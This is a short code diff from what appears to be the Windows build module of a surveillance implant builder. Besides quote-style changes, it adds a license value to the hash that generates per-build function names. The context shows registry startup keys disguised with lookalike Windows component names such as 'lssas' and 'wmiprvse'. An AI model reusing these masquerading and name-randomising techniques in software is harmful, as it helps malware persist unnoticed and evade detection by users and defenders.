@@ -350,12 +350,12 @@ class BuildWindows < Build
   end
 
   def old_reg_start_key(seed)
-    fakever = (seed[2].ord % 11).to_s + "." + seed.slice(0..2).unpack('S').first.to_s
+    fakever = (seed[2].ord % 11).to_s + '.' + seed.slice(0..2).unpack('S').first.to_s
 
     fake_names = ['wmiprvse', 'lssas', 'dllhost', 'IconStor', 'wsus', 'MSInst', 'WinIME',
                   'RSSFeed', 'IconDB', 'MSCache', 'IEPrefs', 'EVTvwr', 'TServer', 'SMBAuth',
                   'DRM', 'Recovery', 'Registry', 'Cookies', 'MSVault', 'MSDiag', 'MSHelp']
-    fake_names[seed.ord % fake_names.size] + " " + fakever
+    fake_names[seed.ord % fake_names.size] + ' ' + fakever
   end
 
   def scout_name(seed)
@@ -439,7 +439,7 @@ class BuildWindows < Build
       first_alpha = @factory.logkey.match(/[a-zA-Z]/)[0]
       first_digit = @factory.logkey.match(/[0-9]/)[0]
       progressive = ('A'.ord + (first_alpha.ord + first_digit + index) % 26).chr
-      @funcnames[index] = first_alpha + Digest::MD5.digest(@factory.logkey).unpack('H*').first[0..7] + progressive
+      @funcnames[index] = first_alpha + Digest::MD5.digest(@factory.logkey + LicenseManager.instance.limits[:magic]).unpack('H*').first[0..7] + progressive
     end
 
     trace :debug, @funcnames.inspect
